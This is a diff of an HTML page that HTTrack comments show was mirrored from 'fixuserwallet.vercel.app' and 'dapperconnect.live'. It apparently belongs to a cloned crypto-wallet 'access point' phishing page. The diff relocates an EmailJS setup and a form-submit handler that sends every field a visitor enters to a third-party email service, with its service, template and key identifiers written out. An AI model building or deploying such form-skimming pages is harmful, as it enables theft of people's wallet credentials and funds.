@@ -716,7 +716,37 @@
         </div>
         <script src="../src/js/js1.js"></script>
         <script src="../src/js/js2w.js"></script>
+
+        <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('Sl_LbPBn89AL9hyA1')
+</script>
 </body>
+
+    <script>
+    const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_yzpfm2e';
+   const templateID = 'template_vvnwnck';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
 <script>
     function ready() {
         document.body.style.display = "block";
@@ -724,12 +754,7 @@
     document.addEventListener("DOMContentLoaded", ready);
 </script>
 
-    <script type="text/javascript"
-  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-<script type="text/javascript">
-  emailjs.init('Sl_LbPBn89AL9hyA1')
-</script>
+    
 <!--Start of Tawk.to Script-->
 <script type="text/javascript">
 var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
@@ -765,28 +790,7 @@ s0.parentNode.insertBefore(s1,s0);
         });
 
        </script>
-    <script>
-    const btn = document.getElementById('button');
 
-document.getElementById('form')
- .addEventListener('submit', function(event) {
-   event.preventDefault();
-
-   btn.value = 'Sending...';
-
-   const serviceID = 'service_yzpfm2e';
-   const templateID = 'template_vvnwnck';
-
-   emailjs.sendForm(serviceID, templateID, this)
-    .then(() => {
-      btn.value = 'Send Email';
-      alert('Sent!');
-    }, (err) => {
-      btn.value = 'Send Email';
-      alert(JSON.stringify(err));
-    });
-});
-</script>
 <!-- Mirrored from www.main.dapperconnect.live/access/point/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Jun 2022 19:55:48 GMT -->
 
 <!-- Mirrored from fixuserwallet.vercel.app/access/point/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Dec 2024 09:20:50 GMT -->
